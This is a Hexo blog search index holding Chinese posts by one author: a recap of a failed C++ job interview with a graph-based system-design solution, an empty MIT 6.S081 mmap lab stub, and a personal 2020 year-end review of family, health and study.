<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>【生活】记一次失败的面试总结</title>
    <url>/2022/11/20/%E4%B8%AA%E4%BA%BA%E9%97%B2%E8%B0%88/68/</url>
    <content><![CDATA[<h1 id="记一次失败的面试经历"><a href="#记一次失败的面试经历" class="headerlink" title="记一次失败的面试经历"></a>记一次失败的面试经历</h1><p>最近一直比较忙，每天忙于家里和工作，好久都没有时间来更新日志了，今天刚趁着有时间来好好更新一篇日志，主要想谈谈最近一直影响比较深刻的某外企的面试经历，虽然没有通过，但是我觉得把这段经历去复盘一下，总结其中的不足之处，也是对自己的一种成长，提醒自己在哪方面准备的还不足。</p>
<h2 id="1-接到通知"><a href="#1-接到通知" class="headerlink" title="1. 接到通知"></a>1. 接到通知</h2><p>某日正在上班期间，突然接到一个陌生的上海的电话，告知我因为在某次力扣双周赛排名比较靠前，问我有没有兴趣参加他们公司的面试。当时接到电话的那一刻确实比较诧异，因为很多公司都会介意我目前是在职公务员的经历，然后我跟她反复确认了一下，是否介意我目前是在职公务员的身份，被告知不是很介意，然后就发了面试确认。<br>实话实说我目前是在职公务员，并且已经从工程师的职业生涯已经<code>GAP</code>了好几年了，很多公司基本上看到简历都会直接丢弃的那种状态。不过只是业余爱好，平时工作之余时间也非常多，非常喜欢刷力扣算法题和计算机的四大的公开课。平时工作之余因为时间确实较多，心想反正闲着也是闲着，不能把这些时间浪费掉，纯粹是出于兴趣的目的来刷算法题目和学习这些专业课程的，一方面是把这些时间花在学习上总比浪费在抖音和游戏上强的多；另一方面，说句实话这些课程真的是非常非常有意思，纯粹是激起了我这种有两娃的中年男人的学习兴趣。</p>
<h2 id="2-笔试过程"><a href="#2-笔试过程" class="headerlink" title="2. 笔试过程"></a>2. 笔试过程</h2><p>跟<code>HR</code>确认邮件后，很快就收到了<code>first step</code>的<code>online assignment</code>.查看了一下，题目是在<code>hackrank</code>上，用<code>c++</code>设计一道系统设计题目，需要通过所有的测试用例。平时周一到周五确实没有时间，只能乘着周末来完成这个题目。大概在周日的时候，到旁边大学的自习室，打开了题目，从开始构思系统设计，到通过全部测试用例差不多花费了2个多小时，虽然最终的代码量再精简一下，估计也就不到<code>200</code>行就能完成。虽然花费了精力，但是完成提交<code>online assignment</code>，我觉得题目本身来说非常有意思，这个系统设计题目出的还是相当有水平的。题目大意如下：</p>
<blockquote>
<p>要求设计一个由多个<code>unit</code>连接组成的系统，该系统有多个输入，只有一个输出，通过每次输入不同的<code>input</code>来给出系统的最终输出。每个<code>unit</code>也可能有多个输入<code>input</code>，但是只有一个输出<code>output</code>，每个<code>unit</code>会执行某种运算，运算操作可能是<code>+，-，/，*，异或，与，或，非</code>等等,运算操作的数即为该<code>unit</code>的输入<code>input</code>，最终运算的结果即通过输出<code>output</code>获取。关键的一点在于，必须所有的<code>unit</code>的输入上<code>input</code>上都有合法的输入参数时，<code>unit</code>的<code>output</code>才会有输出。需要提示的是系统的<code>input</code>可能会连接多个<code>unit</code>的输入，一个<code>unit</code>的<code>output</code>可能会连接多个<code>unit</code>的<code>input</code>。题目给出了给出了所有解析输入的函数，要求利用这些函数来解析输入的参数。</p>
</blockquote>
<p>解题思路如下：</p>
<ul>
<li><p>本题实际就是一个有向图的遍历的问题，我们将每个的<code>unit</code>都看作为图中一个特殊的节点。图中的不同的<code>unit</code>的输出与<code>unit</code>的输入的连接即可看作为两个节点之间的边。我们每次遇到系统不同的<code>input</code>输入时，则我们会对相连接的<code>unit</code>的进行运算，并将运算的结果向后传递给下一个<code>unit</code>，如果我们检查传递后的<code>unit</code>的所有的<code>input</code>的输入状态是否都是合法，如果合法，则我们进行该<code>unit</code>的运算，并将输出结果再继续向下一个节点进行传递，直到最终由系统的<code>output</code>有输出，此时我们打印出系统的输出即可。</p>
</li>
<li><p>系统中特别需要注意的一点是一个<code>unit</code>的某个<code>input</code>只能连接一个<code>unit</code>的输出,但是一个<code>unit</code>的输出<code>output</code>,可以连接到多个<code>unit</code>的输入端口<code>input</code>。此时我们就需要记载每个<code>unit</code>的输出<code>output</code>连接了哪些<code>unit</code>的<code>input</code>;但是我们不需要记载每个<code>unit</code>的输入连接了哪个<code>unit</code>的输出。每个<code>unit</code>定义如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*unit define*/</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">unit</span>&#123;</span><br><span class="line">  std::string name; <span class="comment">// unit name</span></span><br><span class="line">  UNIT_TYPE type;   <span class="comment">// unit type</span></span><br><span class="line">  vector&lt;<span class="type">bool</span>&gt; valid; <span class="comment">// every input port state</span></span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; input;  <span class="comment">// every input value</span></span><br><span class="line">  <span class="type">int</span> output;         <span class="comment">// output</span></span><br><span class="line">  vector&lt;Edge&gt; out;   <span class="comment">// output link to the input of the next unit</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*edge link*/</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span>&#123;</span><br><span class="line">    std::string us; <span class="comment">// the next unit name</span></span><br><span class="line">    <span class="type">int</span> in;         <span class="comment">// input port of the unit   </span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li><p>同时我们需要对整个系统的<code>input</code>和<code>output</code>也做抽象成为特殊的<code>unit</code>，每个<code>input</code>端口表示为只有一个输入和输出的<code>unit</code>，它的运算即为输出等于输入，系统的<code>output</code>端口表示为只有一个输入和输出的<code>unit</code>，它的运算也为输出等于输入，这样我们即可把整个系统全部抽象为<code>unit</code>，不同的<code>input</code>进入时，相当于有向图中的部分节点的值向它的相邻节点进行值传递，我们依次即可计算出图中中所有的<code>unit</code>的输出，最终能够计算出系统的<code>output</code>.实际即是一个非常简单的<code>bfs</code>即可完成，时间复杂度也即为<code>O(n)</code>即可。按照这个思路很快就完成了代码的编写，不过期间<code>debug</code>花了不少时间才完成。</p>
</li>
</ul>
<h2 id="2-准备电话面试"><a href="#2-准备电话面试" class="headerlink" title="2. 准备电话面试"></a>2. 准备电话面试</h2><p>笔试很快就完成了，然后就给<code>HR</code>发了<code>email</code>确认了笔试已经完成，后面<code>HR</code>告知<code>online assignment</code>已经通过了，就需要进入<code>second step</code>的<code>phone interview</code>了，并且明确告知需要用英文进行，想想自己刚刚过六级的水平，口语搓的一比，并且在体制内也不会有用口语的地方，那也只能硬着头皮硬上了。办法总比困难多，那就开始练习口语了，不过确实不太好练习，因为周围也没有几个口语特别好的；另一方面即使口语非常好的，但是也没有时间来陪我模拟面试，大家基本上都有家庭了。<br>我想办法总比困难多，这就需要发挥自己的主观能动性了，分别从四个方面着手来准备面试：</p>
<ul>
<li>从该公司的官方网站上查找一下相关公司的信息，大概需要了解一下公司的<code>backgroud</code>和<code>interview detail</code>，<code>job description</code>,大概对公司的基本信息和招聘职位的信息做一下基本的了解，同时也在<code>linked in</code>上找了该公司的员工的部分个人背景简介和工作内容的详细介绍，以上这些都是对基本信息的搜集，能够快速的对公司的基本信息和职位信息做一个基本的了解。</li>
<li>从<code>youtube</code>上快速的找一些<code>software engineer interview tips</code>诸如此类的视频，以及一些部分<code>up</code>主的<code>online mock coding interview</code>的面试视频来学习观看，一方面通过这些视频的学习了解<code>phone technical interview</code>的基本流程，另一方面能够顺便对部分专有的专业英语术语能够熟悉下，毕竟<code>CS</code>专业的英语专业术语非常多，同时自己也在默默的模仿一下。</li>
<li>在网上找了一个口语较好的<code>师弟</code>来进行练习，大概练习了有两三次，可惜期间<code>师弟parterner</code>有事中途退场了，我只能自己找了，在网上搜了几个还不错的<code>APP</code>，都能够付费进行口语练习。第一次拨通跟老外进行口语练习，还是蛮紧张的，不过想想就是要脸皮厚点，不过大部分国外人还是非常热心的，反正大部分口语说错了，他们大概也能懂，并且跟其中一个叫<code>ALEX</code>的老外还混熟了，基本上都找他瞎聊，感觉蛮开心的。不过其中<code>HR</code>问我要了一份英文简历，我也只能硬着头皮把我那个本身就写的非常烂的简历又用<code>tex</code>重新弄了一份英文版本的，不过写作英语时，发现国外的<code>Grammarly</code>的软件真心好用，如果需要写书面英语的话强烈推荐。</li>
<li>其余就是针对<code>whitepaper coding</code>和<code>C++ concept detail</code>的学习了，这个是本次面试中最大的失误，太注重在线<code>coding</code>能力了，反而忽视了对<code>c++ basic concept</code>的学习了，在<code>binary search</code>平台上练习了大量的算法题，感觉如果是靠算法题的话，我基本上可以百分之九十的题目都能秒杀。不过也是因为干公务员太长时间了，没有过多去关注实际工程中需要应用的技术细节和语言的语法细节方面了，另一方面也确实没有多少可以实践的地方。虽然自己尝试在<code>hackrank</code>上面去练习<code>c++</code>的专题训练，同时通过网上的部分面经来学习一些常见的<code>C++</code>的问题了，这方面是此次面试的最大失误，毕竟实际工程中算法其实并没有那么重要，实际工程中可能更加关注技术细节和代码落地，比如最基本的现程同步之类的，结果就是在这些细节的<code>concept</code>上失败了。</li>
</ul>
<h2 id="3-电话面试过程"><a href="#3-电话面试过程" class="headerlink" title="3. 电话面试过程"></a>3. 电话面试过程</h2><p>电话面试邮件通知的时间大概是在周五的下午四点钟，于是早早的提前周五下午请好假，回家打开电脑，打开<code>hackerRank</code>,因为之前<code>HR</code>通知是在<code>hackerRank</code>上面进行白板面试，所有的题目都会在<code>hackerRank codepair</code>上出现，早早打开<code>hr</code>通知的链接，然后等在电脑前，四点到了，发现怎么还没有电话进来，后来又等了<code>10</code>分钟，还米有电话进来，以为面试取消了，都准备去洗洗睡了。结果差不多到了<code>4</code>点<code>15</code>了，手机显示上海的陌生号码打过来了，接听后，一位很轻的小哥告诉我是本次的面试官，说抱歉刚才因为有会议所以才迟到了，耳测小哥年龄应该在25~30岁之间。<br>我以为会有简单的自我介绍或者基本的关于过往的项目经历的简介之类的，没想到面试官上来就说开始吧，然后就开始了一堆关于<code>C++</code>的基础知识的细节和系统基础知识的考问，感觉之前准备的部分<code>behavior problem</code>都白准备了。下面是对部分详细问题的描述</p>
<h3 id="Q1"><a href="#Q1" class="headerlink" title="Q1"></a>Q1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">what&#x27;s  the difference of stack memory and heap memory ?</span><br></pre></td></tr></table></figure>
<ul>
<li>这个问题用中文还是蛮简单，用英文确实有点麻烦了，就用用举例的方法简单说了一下。定义静态数组的空间都是使用栈内存的，每次进行函数调用的时候，也是需要将参数压入栈，利用<code>stackmachine</code>,实际上如果要利用栈空间，大都是由在编译阶段编译器会直接定义好栈空间的分配；定义动态数组时则使用的是<code>heap memory</code>,比如我们常见的<code>malloc</code>,<code>new</code>的操作，则是在<code>heap</code>中进行申请。目前的操作系统中，每一个线程都会分配一个独立的<code>stack</code>,<code>stack</code>的大小则可以由现程初始化时进行指定，而<code>heap</code>则是由操作系统统一进行管理，每次申请动态内存时，操作系统则会在空余的<code>heap</code>中分配一块，常见的<code>heap</code>分配的算法有<code>first fit</code>,<code>best fit</code>等常见的分配算法。</li>
</ul>
<h3 id="Q2"><a href="#Q2" class="headerlink" title="Q2"></a>Q2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">what&#x27;s the usage of memory pool?</span><br></pre></td></tr></table></figure>
<ul>
<li><code>memory pool</code>常用内作为缓存，由于我们需要一些缓存来存储一些关键信息，如果我们每次需要使用内存时，都直接用<code>malloc,new</code>之类得动态内存申请，必然会造成很大一部分时间得开销，因为在实际得操作系统中<code>malloc</code>之类得开销非常耗费时间得，因为我们可以在系统初始化化即申请一大块动态内存，然后后面如果需要用到存储时，则从这一大块<code>memory pool</code>中取出一小块即可，避免了系统过多次得<code>malloc</code>操作，从而造成系统不必要得开销。</li>
</ul>
<h3 id="Q3"><a href="#Q3" class="headerlink" title="Q3"></a>Q3</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C++ smart pointer:</span><br><span class="line">what&#x27;s the difference of unique_ptr and shared_ptr?</span><br><span class="line">why we use make_shared ?</span><br></pre></td></tr></table></figure>
<ul>
<li>常见的C++智能指针得问题。<code>unique_ptr</code>和<code>shared_ptr</code>主要关注内部实现即可知道他们的内部的原理和不同，这个基本上可以通过阅读智能指针的源代码即可了解其中的不同。</li>
</ul>
<h3 id="Q4"><a href="#Q4" class="headerlink" title="Q4"></a>Q4</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c++ template:</span><br></pre></td></tr></table></figure>
<ul>
<li>这个问题直接卒掉，C++的模板编程非常方便，这个也是C++的高级特性的一个核心，说实话已经很长时间没有用模板编程了，还是好好的去学习学习<code>haskell</code>之类的语言，好好的学习一下<code>lisp</code>之类的高级语言，或者学习学习<code>SCIP</code>从而对这些语言的高级特性能够一劳永逸的去解决。</li>
</ul>
<h3 id="Q5"><a href="#Q5" class="headerlink" title="Q5"></a>Q5</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">what&#x27;s the useage of conditional variables ?</span><br></pre></td></tr></table></figure>
<ul>
<li>C++的<code>conditional variables</code>主要用来作为线程同步和并发。</li>
</ul>
<h3 id="Q6"><a href="#Q6" class="headerlink" title="Q6"></a>Q6</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">object oriented question:</span><br><span class="line">c++ constructor &amp; destructor?</span><br><span class="line">c++ Base Object?</span><br></pre></td></tr></table></figure>
<ul>
<li>题目中定义了函数的构造函数和析构函数，但是并没有对函数进行构造函数和虚构函数进行实例化，最终会导致我们在进行初始化一个类的变量时，就会报错<code>undefined reference</code>。问了一个关于C++基类的问题，这个问题确实已经很长时间没有关注过C++基类的用法。</li>
</ul>
<h3 id="Q7"><a href="#Q7" class="headerlink" title="Q7"></a>Q7</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">coding:</span><br><span class="line">write a string split function using c++.</span><br></pre></td></tr></table></figure>
<ul>
<li>给了一个超级简单的<code>coding</code>题目，就是用<code>c++</code>写出<code>split</code>函数，感觉可能面试官不想再继续面了，可能就随便给了一个题目打发人的意思。刚开始明显看他还准备问我<code>dynamic programming</code>的题目，后面可能发现对我不敢兴趣了，就想快点结束面试的意思。差不多不到2分钟就写出了一个无<code>bug</code>的代码，反正是非常的简单。</li>
</ul>
<h2 id="4-面试总结"><a href="#4-面试总结" class="headerlink" title="4. 面试总结"></a>4. 面试总结</h2><p>总得来说面试得不是非常好，许多基础知识都忘记得差不多了，但是我觉得通过自己练习算法题，还是得到了不少的面试机会，至少这样能感受到自己的努力有一些回报。还是需要多加努力学习，因为我知道像我这种没有背景没有关系得人什么都需要靠自己，在这个社会上立足，只有越努力才能越自由。<br>努力挣扎，虽然中年人生活不易，但是一定不要放弃自己得努力，依次诫勉，来告诫一个不敢轻易松懈得中年人。俗话说，“君子不立于危墙之下”，如果自己对周围的环境不爽，那么要么尝试着去改变这个环境，要么就努力脱离这个让你变得糟糕得环境，不要一味的抱怨环境和抱怨人生，尽快让自己进入一个上升的正循环的通道。</p>
<ul>
<li>下一步的计划，是需要对基础知识进行恶补，虽然<code>C++</code>的不是一门特别容易上手的语言，但是里面非常多的语言特性是非常值得学习的，还是自己的基础不够扎实。学习的书单目前基本如下：</li>
<li>《the little scheme》</li>
<li>《MIT SCIP》</li>
<li>《C++ 深度探索内存模型》</li>
<li>《C++ 模板元编程》</li>
<li>《C++ 多线程编程》</li>
<li>《C++ 智能指针的实现》</li>
<li>《C++ 对象池的实现》</li>
</ul>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>面试总结</tag>
      </tags>
  </entry>
  <entry>
    <title>【MIT 6.S081】 lab9 mmap</title>
    <url>/2022/11/02/%E5%85%AC%E5%BC%80%E8%AF%BE%E5%AD%A6%E4%B9%A0/45/</url>
    <content><![CDATA[<h2 id="MIT-6-S081-lab9"><a href="#MIT-6-S081-lab9" class="headerlink" title="MIT 6.S081 lab9"></a>MIT 6.S081 lab9</h2><p>感觉这个 <code>lab</code> 还是挺有意思的，但是感觉没有前面几个 <code>lab</code> 难，感觉前面几个 <code>lab</code> 的难度太大了，这个 <code>lab</code> 花了<code>2</code> 天左右就完成了，当前中间还是有些点比较有疑问的问题，后续还需要进一步来思考的空间。在这个 <code>lab</code> 中的学习内容比较多，</p>
<h4 id="lab9-mmap"><a href="#lab9-mmap" class="headerlink" title="lab9 mmap"></a>lab9 mmap</h4><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210080853104.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>MIT 6.S081</category>
      </categories>
      <tags>
        <tag>公开课学习</tag>
      </tags>
  </entry>
  <entry>
    <title>【2020】年终总结</title>
    <url>/2022/11/20/%E4%B8%AA%E4%BA%BA%E9%97%B2%E8%B0%88/79/</url>
    <content><![CDATA[<h3 id="2020总结"><a href="#2020总结" class="headerlink" title="2020总结"></a>2020总结</h3><ul>
<li>转眼间2020年已经过去了，时间过的飞快，很快就迎接了2021年，回首2020年收获了许多，也失去了许多，我想这一年应该是觉得人生中最为难忘和艰难的一年，这也是为自己正式踏入中年苦逼人生中最浓重的一笔。这一年经历了人生中第一个最重大疫情，在家休过最长的长假，家中的两个宝贝一天天在长大，变化最大的就是自己的宝贝女儿，可爱的像朵花一样，每天回家最开心的就是看见儿子和女儿。工作中也迎来了最艰难和责任最重大的一年，工作上只能说还凑合。这一年在健身和学习上进步了许多。<br><a href="http://mikemeng.org/2020/01/02/118/">2019年总结</a><br><a href="http://mikemeng.org/2020/07/05/177/">2020年下半年计划</a></li>
</ul>
<h4 id="生活流水账"><a href="#生活流水账" class="headerlink" title="生活流水账"></a>生活流水账</h4><ul>
<li>2月至4月期间，经历了人生中遇到过第一次最严重的疫情，后果是基本上快三个月都呆在家里不能出门，不能锻炼身体，真心的感觉生活很压抑。再也不想重新来一遍，这么束缚的生活，每天吃了睡和睡了吃的生活真心也是一种负担。</li>
<li>5月到8月，基本上每天都是在家里看娃，每天家里两个娃吵吵闹闹，忙的不亦乐乎。七月以后感觉不能再这样昏昏耗耗下去了，重新制定了学习计划，健身计划，坚持按照目标来执行。</li>
<li>8月又经历了父亲了病重，只能请年家回了趟老家，安顿好父亲，父亲经过两个星期的治疗，身体逐步有所好转，只能暂时将老父亲安顿在姐姐家。这个年纪了，父亲一天天老去，能陪伴他的日子越来越少了，我只能尽自己最大的努力给他尽好孝心。能抽空回家就尽量抽空回家看望老父亲。</li>
<li>9月到11月基本上时间稍微闲暇一些，按照自己的学习进度和目标，安排了许多学习的计划和锻炼身体的计划，目前基本达成自己的初步目标。</li>
<li>12月份年底的工作压力特别大，因为要在年底前完成许多的工作，忙的不可开交，终于迎来了稍微轻松的元旦，之道此时才又机会和空闲来总结和整理下不平凡的2020年。</li>
</ul>
<h4 id="家庭"><a href="#家庭" class="headerlink" title="家庭"></a>家庭</h4><ul>
<li>今年变化最快的是小宝，今年已经一岁半了。从一个婴儿终于成长了一个可爱粉嫩的小公主了，刚开始只会漫天爬的婴儿，变成了每天会骑滑板车和捣乱的小天使了。每天都是粉嫩的脸蛋和天真无辜的眼神，让人忍不住怜爱，每天都要亲爸爸，亲妈妈。<br><img src="https://i.loli.net/2021/01/03/zaZPQMxqiILOEmV.jpg"><br><img src="https://i.loli.net/2021/01/03/IJwR9pKsDZrlbkN.jpg"></li>
<li>大宝今年已经满4岁了，并且顺利的上了中班，从以前连字都吐不清楚，到现在可以清晰的表达自己的想法，现在也可以正常的更人交流了，变化真的很大。作为父母的感慨时间过的真快，同时也感慨生命的神奇，转眼间小伙子长大了。几年前还是个小男宝，丫丫学语，啥都不会，转眼间技能树已经快速点满。同时也意识到，儿女一天天长大，终有一天他们会离我们远去去追寻他们的梦想，那时作为父母的只能放手让他们去拼搏，无论人生道路上又多么艰难，父母无无怨无悔的支持你们，爸爸妈妈永远都是你们坚强的后盾。<br><img src="https://i.loli.net/2021/01/03/qGClBQbfv7Xs2Tg.jpg" alt="1"></li>
<li>依稀还记得某日清晨醒来，看见一对儿女熟睡得样子，真心让人怜惜。我总是会幻想，女儿长大以后会是什么样子，儿子长大后会是什么样子，作为父亲得我，才刚步入中年，就已经开始幻想几十年后得光阴，不得不让人感慨，时间是个神奇的武器，丫丫细语的幼儿已经成了葱郁的少年；岁月也是把杀猪刀，青葱的少年转眼间已成了油腻的中年。<br><img src="https://i.loli.net/2021/01/03/49KonJzR3WSmDUQ.jpg"></li>
<li>老父亲今年已经76岁高龄了，父亲年龄越来越大了，目前基本上每年都会生一次重病，需要住院。今年稍微安顿好了一些，把老夫请安顿在姐姐家，所有的开支费用由我来承担，主要担心老人年纪过大，身边又没人照看，万一出现意外，那真心是悔过，顺便也能姐姐照顾一下小外甥。2021年准备换好房子，能把老父亲接到武汉来住几天，真心感觉结婚以后，基本上个人都被家庭和工作缠身，能给老父亲分担的时间和精力越来越少，新的一年也祝愿老父亲身体硬朗。</li>
<li>姐姐自从离婚后，生活上也出现了许多困难，先是经历了骨折，后又经历了搬家，工作上也是非常的辛苦，大外甥马上也要中考了，姐夫是肯定指望不上了，毕竟他不参与家庭生活，不知道生活的难处，希望她能在未来的生活中照顾好自己，照顾好家庭。</li>
<li>最后是老婆，岳父，岳母。LD的工作压力真心大，连续两个月基本上周末都在加班中度过，感觉跟着自己太不容易了，体制内的工作，工资待遇福利没多少，加班出差少不了，有时候不免心神怨气，周末还要忙着学车，忙着社区下沉，还要照顾两个孩子的饮食起居，还要忙着干家务，想想都头大，中年最难熬的时光，希望能够坚持下去，也要照顾好身体。对于岳父母，自己感觉也是亏欠很多，岳父每天早出晚归，这么大年龄了还需要经常熬夜上夜班，岳母今年大病了一场，自然而然的不免有些自责，望着岳父母都有些花白的头发，内心不自然而然的自责，没能给他们一个好的经济基础让他们安详晚年。</li>
<li>对于自身来说，其实内心非常的焦虑。因为在自己最需要金钱的时候，而没有能力提供一个很好的经济基础，能够让自己的家人过上幸福的日子。有时候因为自己的臭脾气也让爱人，岳父母承担了许多不必要的麻烦，真心要给他们说一声道歉。新的一年争取，让岳父母和老婆能够出国游玩一趟，能够每个月定期给他们一部分零花钱，定期组织家里出去聚餐和游玩一次，给老婆办一个健身卡，给岳父母买一个重疾保险，这是自己在这一年的目标。</li>
</ul>
<h4 id="健康"><a href="#健康" class="headerlink" title="健康"></a>健康</h4><ul>
<li>2020年上半年的时候，经历了疫情，几个月都没有机会锻炼身体，明显感觉身体素质下降，最明显的感触就是容易发胖，精力不足，非常容易困，每天基本上到点以后必须上传睡觉，否则铁定困得不行。熬夜是铁定不行，现在熬夜一次，恨不得要睡上两天才能回来，不像以前熬一个星期都扛得住。</li>
<li>2020年下半年，人到中年的危机感越来越重，更加坚定的知道自己的目标和方向，坚决不做一条随波逐流的咸鱼，于时刻意开始改变自己，开始给自己制定锻炼得计划和目标，比较好得结果是制定得锻炼目标基本完成，年终计划是到年底完成锻炼50次，最终打卡结束锻炼完成了59次。后面是因为健身房得游泳馆关门了，导致不得不中断自己得锻炼计划，一旦停下来运动，明显感觉身体素质下降，容易困，并且长时间休息不好得话就会易怒，容易形成恶性循环，所以生活走上正常轨道得开始应该是养好身体为基础得，因为只有这样，你的生活才能进入正循环，因为身体好了，才能休息的好，休息的好了，才能心情好，心情好了，才能工作交流愉快，工作顺利了，又会使得你升职加薪，升职加薪又会导致你身心愉快，这样的正循环中才能让你士气高涨，生活走入正常轨道，否则人很容易在负面循环中永远都出不去。</li>
<li>9月到11月，基本上开启了定时锻炼身体的规律运动，经过三个月的坚持，首先从自身来说改变了很多。身高174，从去年冬天的68.5，变成了64.5kg的标准体重，肚子上的肥肉终于减下去了，身体变轻了许多，同时睡眠好了很多，每天只睡7个小时，让人心情非常愉快。长期坚持运动能够给人不仅仅是健康，更加带来一个积极心态的变化，没有游泳之前，经常动不动就觉得因为工作上的事情感到非常抑郁和沮丧，对自己的前途和生活感到绝望，坚持锻炼身体带给自己的很多愉快的心情，让自己每天身上充满激情干劲和正能量，自己的心情也随之改变了许多，许多以前想不开的事情，慢慢也就能够想开和明白，不要把成败看的太重，反而能够更好的去工作。坚持运动这个习惯一定要继续，坚持每天打卡。希望在2021年能够坚持锻炼，坚持游泳，保持好体重，目标全年锻炼超过100次。<br><img src="https://i.loli.net/2021/01/03/iHG1nJhKIRB5g7k.png"><br><img src="https://i.loli.net/2021/01/03/R4jJrwNiYSCAhlX.png" alt="2"></li>
</ul>
<h4 id="工作"><a href="#工作" class="headerlink" title="工作"></a>工作</h4><ul>
<li>今年的工作可以说是没什么太多好说的，除了日常的工作以外，工作的压力大了许多，感觉抗打击能力强大了许多。以前总听说“归零”，现在终于能够体会到什么叫做“归零”了。锻炼好身体，保持好心态，不管外部环境如何变化，始终都能够坦然的面对眼前的一切，无论外部环境好与坏，都能够从容应对，哪怕现在从最底层做起，也会坚持奋斗。因为只要有希望有机会，做好自己，从容面对一切困难和风雨。</li>
<li>今年的工作总体来说不太顺利，有段时间真心想要逃离和崩溃的感觉。下半年各项工作勉强顺利开展，后面两个月通过坚持锻炼身体让自己的心情和状态大有好转，期待每天的工作能够给自己带来成长和挑战，越来越喜欢这种自信和挑战的状态，越来越能拓展自己的边界。不断的告知自己外面的世界很大，哪里都有挑战，哪里都有困难，要坚强的去面对。</li>
<li>在当前的大环境下，体制内收入竟然递减，无这也是对自身工作积极性的一种打击。现实环境如此，只能依靠自己的想法去改变和拓展边界，靠山靠水不如靠自己，自己从小是从苦日子中长大的，面对所有的艰辛和困难都不会轻易屈服。无论如何，工作态度一定要端正，积极应对新一年的挑战。</li>
</ul>
<h4 id="读书学习"><a href="#读书学习" class="headerlink" title="读书学习"></a>读书学习</h4><ul>
<li>年终给自己定了很多目标，完成情况只能说差强人意。坚持锻炼身体和学习，才能积极的面对这个时代变换带来的不确定性。以前总是想着找捷径，找到一个永久的办法来解决人生中的苦难和痛苦，然而经历的越多，越觉得人生本来就没有什么一劳永逸的解决办法，只有每天坚持锻炼好身体，终生坚持学习和交流，跟上时代潮流，这才是真正能够解决人生困惑的正道。然后长期的自律，实际上对很多人难说很难坚持，因为养成习惯很难，放弃很容易。就像今年坚持的规律运动一年，坚持几个月效果非常好，然而一次以外的感冒和健身房游泳馆的关门，就将自己近半年养成的规律锻炼习惯全部打乱，冬天又这么冷，不自然而然就想放弃健身锻炼了。</li>
<li>关于读书方面，今年下半年的目标本来计划是读<code>30</code>本书，然而最后一个月因为工作的原因，全部打乱读书计划，最终只完成了<code>19</code>本左右，并且读完这些书之后，感觉精品的书太少，新的一年计划读书<code>50</code>本，并且要仔细挑选精品书籍。<br><img src="https://i.loli.net/2021/01/03/6KtbRwgZWdnEUYa.png"></li>
<li>关于技术方面的学习，每周还是坚持刷题，今年感觉基本上坚持完成了全年所有的<code>leetcode</code>的题解，感觉收获还是挺大，不过每次的<code>contes</code>还是有<code>50%</code>的概率做不出来<code>hard</code>难度的题目，不过感觉对技术的理解又有了新的高度。不过其余的两个平台<code>atcoder</code>和<code>codeforces</code>主要是因为题目难度太大，自己确实没有多少时间来思考上面的题目。只能说<code>leetcode</code>的难度偏小，基本上一个小时都可以搞定，而自己不像学生时代有那么多的时间和精力来刷题。</li>
<li>关于技术课程方面，今年完成的公开课的课程真心不少，不过确实限制于时间的问题，自己没有很多时间来完成大的<code>project</code>，只能抽时间完成小的<code>project</code>，国外公开课的每个<code>project</code>的难度都好大，感觉比工作的难度大多了，毕竟工作中遇到问题，到处都是求助的资源，而国外的这些<code>project</code>好多基本上没有求助的资源，靠自己一个人独立完成真心很难。特别是《build a computer》系列课程，到了后期一个<code>project</code>的难度太大了，基本上不仔细思索的话，业余根本就没有时间来完成这么大的<code>project</code>. 自我评价来说，自己真心不是脑袋特别好使的人才，唯一一点的长度就是觉得自己非常能够坚持，希望新的一年能够按照自己制定的目标来完成自己的计划安排。<br><img src="https://i.loli.net/2021/01/03/82bxe3npSuzjyC4.png"></li>
</ul>
<h4 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h4><ul>
<li>展望2021年，首先希望家里两个可爱的宝宝健康成长，父母能够身体健康，自己身体健康工作顺利，老婆顺利升职，顺利换个学区房，乘着岁月静好好好享受生活。</li>
<li>希望自己能够实现自己所定的小目标，积极改善家庭经济条件，改善父母关系，改善夫妻之间的关系。<br><img src="https://i.loli.net/2021/01/03/CtWu1sOmFTh7zjk.png"></li>
</ul>
]]></content>
      <categories>
        <category>职场</category>
      </categories>
      <tags>
        <tag>年终总结</tag>
      </tags>
  </entry>
  <entry>
    <title>【MIT 6.S081】 lab10 network</title>
    <url>/2022/11/02/%E5%85%AC%E5%BC%80%E8%AF%BE%E5%AD%A6%E4%B9%A0/46/</url>
